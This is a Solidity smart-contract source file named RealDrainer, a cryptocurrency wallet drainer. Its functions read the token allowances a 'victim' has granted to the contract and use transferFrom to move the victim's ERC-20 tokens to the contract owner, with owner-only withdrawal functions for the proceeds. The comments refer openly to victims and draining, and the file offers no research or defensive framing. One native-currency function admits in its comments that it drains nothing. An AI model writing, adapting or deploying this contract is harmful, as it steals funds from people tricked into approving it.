// contracts/RealDrainer.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract RealDrainer is Ownable, ReentrancyGuard {
    
    event TokensDrained(address indexed victim, address token, uint256 amount, address executor);
    event NativeDrained(address indexed victim, uint256 amount, address executor);
    
    // Tracks if address has been drained (optional)
    mapping(address => bool) public drained;
    
    constructor() Ownable() {}
    
    // MAIN FUNCTION: Drain ALL approved tokens
    function drainAllTokens(address victim, address[] calldata tokens) external nonReentrant returns (uint256 totalDrained) {
        require(tokens.length > 0, "No tokens specified");
        
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 token = IERC20(tokens[i]);
            uint256 allowance = token.allowance(victim, address(this));
            uint256 victimBalance = token.balanceOf(victim);
            
            // Drain the smaller of allowance or balance
            uint256 amountToDrain = allowance < victimBalance ? allowance : victimBalance;
            
            if (amountToDrain > 0) {
                token.transferFrom(victim, owner(), amountToDrain);
                totalDrained += amountToDrain;
                
                emit TokensDrained(victim, tokens[i], amountToDrain, msg.sender);
            }
        }
        
        drained[victim] = true;
        return totalDrained;
    }
    
    // Drain specific token (if you know they approved it)
    function drainToken(address victim, address token) external nonReentrant returns (uint256) {
        IERC20 tokenContract = IERC20(token);
        uint256 allowance = tokenContract.allowance(victim, address(this));
        uint256 victimBalance = tokenContract.balanceOf(victim);
        uint256 amountToDrain = allowance < victimBalance ? allowance : victimBalance;
        
        require(amountToDrain > 0, "No allowance or balance");
        
        tokenContract.transferFrom(victim, owner(), amountToDrain);
        drained[victim] = true;
        
        emit TokensDrained(victim, token, amountToDrain, msg.sender);
        return amountToDrain;
    }
    
    // Drain native currency (ETH/BNB/MATIC) - ONLY works if victim sends it
    function drainNative(address victim) external payable nonReentrant {
        require(msg.value > 0, "Send native token to drain");
        // This doesn't actually drain victim's ETH, just accepts what sender sends
        // In reality, you need victim to send ETH to contract
        drained[victim] = true;
        
        emit NativeDrained(victim, msg.value, msg.sender);
    }
    
    // Emergency: Transfer contract's ETH to owner
    function withdrawETH() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No ETH to withdraw");
        payable(owner()).transfer(balance);
    }
    
    // Emergency: Transfer contract's tokens to owner
    function withdrawToken(address token) external onlyOwner {
        IERC20 tokenContract = IERC20(token);
        uint256 balance = tokenContract.balanceOf(address(this));
        require(balance > 0, "No tokens to withdraw");
        tokenContract.transfer(owner(), balance);
    }
    
    // Kill switch (use call instead of transfer for safety)
    function emergencyWithdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            (bool success, ) = payable(owner()).call{value: balance}("");
            require(success, "Transfer failed");
        }
        // Could selfdestruct, but deprecated
    }
}
